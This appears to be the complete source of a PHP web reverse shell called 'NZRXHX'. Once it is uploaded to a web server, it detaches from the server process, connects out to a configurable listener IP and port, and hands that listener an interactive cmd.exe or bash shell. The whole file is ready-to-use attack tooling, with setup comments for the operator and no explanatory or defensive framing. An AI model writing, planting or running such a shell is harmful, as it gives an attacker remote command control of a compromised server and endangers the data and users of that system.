<?php
// ============== NZRXHX =============
// NZRXHX PHP based web reverse shell
// ========== CONFIGURATION ==========
$allowed_hosts = ['192.168.1.1']; //Change this (takes a list of IPs if multiple devices will open a reverse shell)
$remote_host   = '192.168.1.1'; //Change this to your listener IP
$remote_port   = 443; //Change this to your listening port
$timeout       = 10;

// ========== SANITY CHECK ==========
$client_ip = gethostbyname(gethostname());
if (!in_array($remote_host, $allowed_hosts)) exit;

// ========== SHELL ==========
$os = strtoupper(substr(PHP_OS, 0, 3));
$shell_cmd = ($os === 'WIN') ? 'cmd.exe' : '/bin/bash -i';

// ========== DAEMONIZE ==========
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid === -1) exit;
    if ($pid > 0) exit;
    posix_setsid();
}

// ========== CONNECT BACK ==========
$socket = stream_socket_client("tcp://$remote_host:$remote_port", $errno, $errstr, $timeout);
if (!$socket) exit;
stream_set_blocking($socket, false);

// ========== LAUNCH SHELL ==========
$descriptors = [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w']
];
$process = proc_open($shell_cmd, $descriptors, $pipes);
if (!is_resource($process)) {
    fclose($socket);
    exit;
}
foreach ($pipes as $p) stream_set_blocking($p, false);

// ========== MAIN LOOP ==========
$last_keepalive = time();

while (true) {
    $read = [$socket, $pipes[1], $pipes[2]];
    $write = $except = null;

    $changed = stream_select($read, $write, $except, 30); // 30s timeout
    if ($changed === false) break;

    if (in_array($socket, $read)) {
        $in = fread($socket, 2048);
        if ($in === false || strlen($in) === 0) break;
        fwrite($pipes[0], $in);
    }

    foreach ([$pipes[1], $pipes[2]] as $pipe) {
        if (in_array($pipe, $read)) {
            $out = fread($pipe, 2048);
            if ($out === false) break 2;
            fwrite($socket, $out);
        }
    }

    // Optional: keepalive ping every 60s
    if (time() - $last_keepalive > 60) {
        fwrite($socket, "\n");
        $last_keepalive = time();
    }
}

// ========== CLEANUP ==========
fclose($socket);
foreach ($pipes as $p) fclose($p);
proc_close($process);
?>
